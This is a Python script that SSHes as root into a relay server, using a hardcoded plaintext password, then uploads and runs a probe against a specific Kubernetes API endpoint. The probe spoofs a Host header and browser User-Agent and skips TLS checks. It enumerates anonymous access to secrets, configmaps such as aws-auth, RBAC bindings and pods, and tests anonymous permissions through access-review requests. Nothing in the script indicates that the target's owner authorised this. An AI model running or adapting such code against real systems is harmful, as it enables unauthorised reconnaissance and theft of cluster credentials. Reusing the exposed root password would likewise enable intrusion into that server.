import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys
urllib3.disable_warnings()
IP = "35.238.21.37"
HOST = "bff-origination-service.orquesta.calidad-architect.com"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

def probe(path, desc=""):
    try:
        r = requests.get(
            f"https://{IP}{path}",
            headers={"Host": HOST, "User-Agent": UA, "Accept": "application/json,*/*"},
            timeout=5, verify=False, allow_redirects=False
        )
        body = r.text[:600]
        is_k8s_401 = r.status_code == 401 and '"kind":"Status"' in body.replace(" ","").replace("\n","")
        if is_k8s_401:
            sys.stdout.write(f"  [401-K8s] {path}\n")
        else:
            sys.stdout.write(f"  [{r.status_code}] {path} ({len(r.text)}b) {desc}\n")
            sys.stdout.write(f"    BODY: {repr(body)}\n")
            hdrs = {k:v for k,v in r.headers.items()}
            sys.stdout.write(f"    HDRS: {json.dumps(hdrs)}\n")
        sys.stdout.flush()
        return r.status_code, r.text
    except Exception as e:
        sys.stdout.write(f"  [ERR] {path}: {e}\n")
        sys.stdout.flush()
        return 0, ""

sys.stdout.write("=== K8s ANONYMOUS ACCESS PROBE ===\n\n")

sys.stdout.write("--- Standard anonymous K8s paths ---\n")
for p in [
    "/version", "/healthz", "/livez", "/readyz",
    "/api", "/apis", "/api/v1",
    "/openapi/v2", "/openapi/v3",
    "/.well-known/openid-configuration",
    "/metrics",
]:
    probe(p)

sys.stdout.write("\n--- K8s resource paths ---\n")
for p in [
    "/api/v1/namespaces",
    "/api/v1/pods",
    "/api/v1/services",
    "/api/v1/nodes",
    "/api/v1/configmaps",
    "/api/v1/secrets",
    "/apis/apps/v1/deployments",
    "/apis/extensions/v1beta1/ingresses",
    "/apis/networking.k8s.io/v1/ingresses",
    "/api/v1/namespaces/default/pods",
    "/api/v1/namespaces/kube-system/pods",
    "/api/v1/namespaces/kube-system/configmaps",
    "/api/v1/namespaces/kube-system/secrets",
]:
    probe(p)

sys.stdout.write("\n--- K8s special paths ---\n")
for p in [
    "/api/v1/namespaces/kube-public/configmaps/cluster-info",
    "/api/v1/namespaces/kube-system/configmaps/kubeadm-config",
    "/api/v1/namespaces/kube-system/configmaps/aws-auth",
    "/apis/rbac.authorization.k8s.io/v1/clusterroles",
    "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings",
    "/api/v1/componentstatuses",
    "/apis/apiregistration.k8s.io/v1/apiservices",
    "/swagger.json",
    "/swaggerapi",
]:
    probe(p)

sys.stdout.write("\n--- Verb test (POST to tokenreviews for anon check) ---\n")
try:
    r = requests.post(
        f"https://{IP}/apis/authentication.k8s.io/v1/tokenreviews",
        headers={"Host": HOST, "User-Agent": UA, "Content-Type": "application/json"},
        json={"apiVersion": "authentication.k8s.io/v1", "kind": "TokenReview", "spec": {"token": "test"}},
        timeout=5, verify=False
    )
    sys.stdout.write(f"  TokenReview: [{r.status_code}] {r.text[:400]}\n")
except Exception as e:
    sys.stdout.write(f"  TokenReview ERR: {e}\n")
sys.stdout.flush()

sys.stdout.write("\n--- SelfSubjectAccessReview (anon perms) ---\n")
try:
    r = requests.post(
        f"https://{IP}/apis/authorization.k8s.io/v1/selfsubjectaccessreviews",
        headers={"Host": HOST, "User-Agent": UA, "Content-Type": "application/json"},
        json={
            "apiVersion": "authorization.k8s.io/v1",
            "kind": "SelfSubjectAccessReview",
            "spec": {"resourceAttributes": {"namespace": "default", "verb": "list", "resource": "pods"}}
        },
        timeout=5, verify=False
    )
    sys.stdout.write(f"  SSAR: [{r.status_code}] {r.text[:400]}\n")
except Exception as e:
    sys.stdout.write(f"  SSAR ERR: {e}\n")
sys.stdout.flush()

sys.stdout.write("\n--- SelfSubjectRulesReview (what can anon do?) ---\n")
try:
    r = requests.post(
        f"https://{IP}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews",
        headers={"Host": HOST, "User-Agent": UA, "Content-Type": "application/json"},
        json={
            "apiVersion": "authorization.k8s.io/v1",
            "kind": "SelfSubjectRulesReview",
            "spec": {"namespace": "default"}
        },
        timeout=5, verify=False
    )
    sys.stdout.write(f"  SSRR: [{r.status_code}] {r.text[:600]}\n")
except Exception as e:
    sys.stdout.write(f"  SSRR ERR: {e}\n")
sys.stdout.flush()

sys.stdout.write("\n=== DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/k8s_anon.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/k8s_anon.py 2>&1', timeout=120)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Done.', flush=True)
